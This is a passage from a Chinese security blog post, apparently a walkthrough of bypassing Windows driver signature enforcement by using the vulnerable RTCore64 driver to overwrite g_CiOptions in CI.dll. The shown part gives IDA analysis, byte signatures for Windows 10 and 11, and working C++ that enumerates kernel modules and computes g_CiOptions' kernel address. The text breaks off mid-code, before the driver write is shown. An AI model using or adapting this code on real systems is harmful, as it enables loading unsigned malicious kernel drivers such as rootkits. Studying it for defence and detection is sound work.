---
title: Windows内核攻防—利用RTCore64驱动绕过Windows签名校验
url: https://mp.weixin.qq.com/s/FGRaKlA2bbfNB90lt3qW1A
source: Doonsec's feed
date: 2026-03-13
fetch_date: 2026-03-14T04:11:36.984652
---

# Windows内核攻防—利用RTCore64驱动绕过Windows签名校验

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/pgh9MpJCA6iaFbbVbHibZhIwgMxPibX0Z3WRL8VPpQQicF4yxIs0b8M2eicBqibPyBibwLI68Co27ib5BiakFzYgqd4vJ9yh0fCVibc3QlKkBic3IxdQok/0?wx_fmt=jpeg)

# Windows内核攻防—利用RTCore64驱动绕过Windows签名校验

原创

脸红ฅฅ的思春期
脸红ฅฅ的思春期

Heri76安全

![]()

在小说阅读器中沉浸阅读

## 前言

好久没有发过文章了，难得今天有空，顺手发表记录一下最近的学习。

众所周知，Windows加载驱动会验证驱动是否有微软的签名，这也就是是所谓的DSE机制。每次我们开机的时候，Windows内核都会加载 CI.dll 中的一个全局变量 g\_CiOptions 来判定是否开启DSE机制。那么整体攻击思路就很简单了，借助 BYOVD 进入到内核去修改 g\_CiOptions 的值，关闭DSE，从而能够加载我们自己手写的驱动，这也是以前较为流行的攻击手法。

## g\_CiOptions定位

由于 g\_CiOptions 这个全局变量是没有导出的，所以我们只能通过特征码去寻找它的位置。用IDA打开CI.dll，来到 name 页面直接搜 CiInitialize 在CI.dll中的位置。它是 CI.dll 中的一个导出函数，我们通过它来作为切入点。

![](https://mmbiz.qpic.cn/mmbiz_png/pgh9MpJCA6h22d6G2klkJL7dzXgQdlCcWkuP75moHMxygUemPbKPkOWqriahibGSz3DVOE99vZ6Z1Fx2CoOB6aB6XAiaVdKYpCaR2WCrU5Ribrg/640?wx_fmt=png&from=appmsg)

然后双击进去，发现CiInitialize 函数主要是调用 CipInitialize 函数的。

![](https://mmbiz.qpic.cn/mmbiz_png/pgh9MpJCA6jCibMU5mPA30CoSeibSicm3fHcT4sPuicMNamm6dsnPnGTeE9rTV41C95Ydu52b0XPoXia0X3jK9QUw8tIg8Gg0dRtOpTEEiaLA42Uw/640?wx_fmt=png&from=appmsg)

继续跟进，发现在 CipInitialize 函数里面有一个赋值语句 g\_CiOptions = a1 这个就是我们要找的地方。

![](https://mmbiz.qpic.cn/mmbiz_png/pgh9MpJCA6gBBWkdnTicMN3AjiaUicPibXZCuhAAI1LWsyN5j98Pg95kgqG8XP1TURqvuAWWqBC61qHj9zBoWTFy3ZH6UriaibCr8Gz72QPyC6w6A/640?wx_fmt=png&from=appmsg)

我们点击 g\_CiOptions 然后按下 tab 键切换到汇编查看，可以看到 g\_CiOptions = a1 的汇编语句是

```
 mov     cs:g_CiOptions, ecx
```

机器码如下，机器码也就是我们要找的特征码，注意这里其实89 0D 才是真正的机器码，后面的四个只是偏移量，这个偏移量是机器不稳定的，有可能Windows的一个小更新，这个偏移量就变了，所以偏移量不能作为特征码。

```
89 0D 09 C4 FF FF
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/pgh9MpJCA6h1QCRuBI0gJp0zRictPHvwXibzxoeuQ1UNicqk21x01lySJ4DpVBj5mx612OCowkDiaA9kadyC9xRM6WLMUZ18z8IFZ7YwEKTVSIs/640?wx_fmt=png&from=appmsg)

所以现在我们 g\_CiOptions 的特征码就是 89 0D，但是整个CI.dll 存在太多 89 0D的机器码了，如果只靠这两个，那么很容易找错了。所以此时我们结合 89 0D 的上调语句的机器，来进行结合寻找。

```
48 8B EA                mov     rbp, rdx
```

所以最终的特征码是，要注意这个特征码只适合Windows11用。

```
0x48 0x8B 0xEA 0x89 0x0D
```

我又分析了一下Windows10的CI.dll，特征码如下。

```
0x49, 0x8B, 0xE9, 0x89, 0x0D
```

现在特征码找到了，要如何在内核中定位 g\_CiOptions 的位置呢，方法也非常简单。我们通过NtQuerySystemInformation 去枚举内核的所有加载模块，找到 CI.dll 在内核中的地址，然后就从CI.dll的地址开始扫描，直到匹配到特征码就结束，此时找到的就是 g\_CiOptions的地址了。

下面是NtQuerySystemInformation 的信息，同样这也是一个未导出的函数。

![](https://mmbiz.qpic.cn/mmbiz_png/pgh9MpJCA6iaSnLVdckgWdLeprVT767iaR4RnJLJv5yPchoNN1WrUGV3ic1ZaJrPIXh1F86CbCAJqPbpHFkt74nUJlMiafOX9xT4Z4VQgrZm7NI/640?wx_fmt=png&from=appmsg)

整体寻找位置代码如下，代码不算复杂，逻辑和上面说的一样。

```
#include <windows.h>#include <stdio.h>#include <winternl.h>
// 状态码#define STATUS_SUCCESS 0x00000000#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
// 查询类别：11代表系统模块信息constexpr SYSTEM_INFORMATION_CLASS SystemModuleInformation = (SYSTEM_INFORMATION_CLASS)11;
// --- 未文档化结构体定义 ---typedef struct _RTL_PROCESS_MODULE_INFORMATION {    HANDLE Section;    PVOID MappedBase;    ULONG64 ImageBase;         // 模块加载的基址    ULONG ImageSize;         // 模块在内存中的大小    ULONG Flags;    USHORT LoadOrderIndex;    USHORT InitOrderIndex;    USHORT LoadCount;    USHORT OffsetToFileName; // 文件名在 FullPathName 中的起始偏移量    CHAR FullPathName[256];  // 模块的绝对路径 (ANSI字符串)} RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION;
typedef struct _RTL_PROCESS_MODULES {    ULONG NumberOfModules;   // 系统当前加载的模块总数    RTL_PROCESS_MODULE_INFORMATION Modules[1]; // 模块数组首元素} RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;
// --- API指针类型定义 ---typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)(    SYSTEM_INFORMATION_CLASS SystemInformationClass,    PVOID SystemInformation,    ULONG SystemInformationLength,    PULONG ReturnLength    );
// 这是一个辅助函数，用于在内存中搜索特征码// pattern 中允许使用 '?' 作为通配符（忽略该字节的匹配）// signature: "\x48\x8B\x00\xE8\x00\x00\x00\x00" // mask:      "xx?x????" (x代表精确匹配，?代表通配符)bool DataCompare(const BYTE* pData, const BYTE* bMask, const char* szMask) {    for (; *szMask; ++szMask, ++pData, ++bMask) {        if (*szMask == 'x' && *pData != *bMask) {            return false;        }    }    return (*szMask) == 0; // 如果掩码走完都没出错，说明完全匹配}

ULONG64 FindCiOptionAddress(ULONG64 ciBase){    HMODULE hLocalCi = LoadLibraryExA("C:\\Windows\\System32\\ci.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);    if (!hLocalCi) {        printf("[-] Error: 无法加载本地 CI.dll, 错误码: %d\n", GetLastError());        return -1;    }    printf("[+] Local CI.dll loaded at user-mode address: 0x%p\n", hLocalCi);
    // 3. 获取本地模块的各种头信息，以便知道要扫描多大    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hLocalCi;    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hLocalCi + pDosHeader->e_lfanew);    DWORD imageSize = pNtHeaders->OptionalHeader.SizeOfImage;    printf("[+] Image Size to scan: 0x%X bytes\n", imageSize);
    // 4. 定义你的特征码    //BYTE pattern[] = { 0x48, 0x8B, 0xEA, 0x89, 0x0D }; // 前 5 个固定字节    BYTE pattern[] = { 0x49, 0x8B, 0xE9, 0x89, 0x0D};    const char* mask = "xxxxx"; // 简化版，先看能不能搜到这5个字节
    // 5. 开始在【用户态本地内存】中扫描    printf("[*] 开始执行特征码扫描...\n");    bool bFound = false;    ULONGLONG  finalKernelAddress;
    for (DWORD i = 0; i < imageSize - 10; i++) {        BYTE* currentAddress = (BYTE*)hLocalCi + i;
        if (DataCompare(currentAddress, pattern, mask)) {            bFound = true;            printf("[+] 找到匹配特征码！本地内存地址: 0x%p\n", currentAddress);
            // 6. 提取偏移量 (Offset)             // 89 0D 后面的 4 个字节就是偏移量            LONG offset = *(LONG*)(currentAddress + 5);            printf("[+] 提取出的指令偏移量 (Offset): 0x%X\n", offset);
            // 7. 计算相对虚拟地址 (RVA)            // nextInstruction RVA = (当前指令地址 - 模块基址) + 指令总长度(9)            ULONG64  nextInstructionRVA = (ULONG64)((BYTE*)currentAddress - (BYTE*)hLocalCi) + 9;
            // g_CiOptions 的 RVA = nextInstruction RVA + offset            ULONG64  g_CiOptions_RVA = nextInstructionRVA + offset;            printf("[+] 计算得出 g_CiOptions 的相对偏移 (RVA): 0x%X\n", g_CiOptions_RVA);
            // 8. 计算最终的内核绝对地址！            finalKernelAddress = (ULONGLONG)ciBase + (ULONGLONG)g_CiOptions_RVA;            printf("[!] >>> 终极目标：内核 g_CiOptions 真实绝对地址: 0x%llX <<<\n", finalKernelAddress);
            break; // 找到了就退出循环        }    }

    if (!bFound) {        printf("[-] 扫描结束。未找到特征码！可能是当前系统版本的 CI.dll 特征码改变了。\n");        return 0;    }
    FreeLibrary(hLocalCi);    return finalKernelAddress;
}
int main() {    // 1. 获取 ntdll.dll 句柄并导出函数    HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");    if (!hNtDll) {        printf("[-] Failed to load ntdll.dll\n");        return 1;    }
    PNtQuerySystemInformation NtQuerySystemInformation =        (PNtQuerySystemInformation)GetProcAddress(hNtDll, "NtQuerySystemInformation");
    if (!NtQuerySystemInformation) {        printf("[-] Failed to get NtQuerySystemInformation address\n");        return 1;    }
    ULONG bufferSize = 0;    PVOID buffer = nullptr;    NTSTATUS status;
    ULONG64 CIDLLadress;    ULONG64 CiOption;
    // 2. 探针调用，获取系统建议的缓冲区大小    NtQuerySystemInformation(SystemModuleInformation, &bufferSize, 0, &bufferSize);
    // 3. 循环分配足够大的内存    while (true) {        buffer = malloc(bufferSize);        if (!buffer) {            printf("[-] Memory allocation failed!\n");            return 1;        }
        status = NtQuerySystemInformation(SystemModuleInformation, buffer, bufferSize, &bufferSize);
        if (status == STATUS_INFO_LENGTH_MISMATCH) {            free(buffer);            // 如果在这极短的时间内系统加载了新模块导致大小又不够了，增加点余量重试            bufferSize += 8192;        }        else {            break;        }    }
    // 4. 解析并打印模块列表    if (status == STATUS_SUCCESS) {        PRTL_PROCESS_MODULES pModules = (PRTL_PROCESS_MODULES)buffer;
        printf("[+] Successfully retrieved system modules.\n");        printf("[+] Total Modules Loaded: %lu\n\n", pModules->NumberOfModules);
        // 打印表头        printf("%-18s %-10s %-25s %s\n", "Base Address", "Size", "Module Name", "Full Path");        printf("------------------------------------------------------------------------------------------\n");
        // 遍历所有模块        for (ULONG i = 0; i < pModules->NumberOfModules; i++) {            PRTL_PROCESS_MODULE_INFORMATION moduleInfo = &pModu...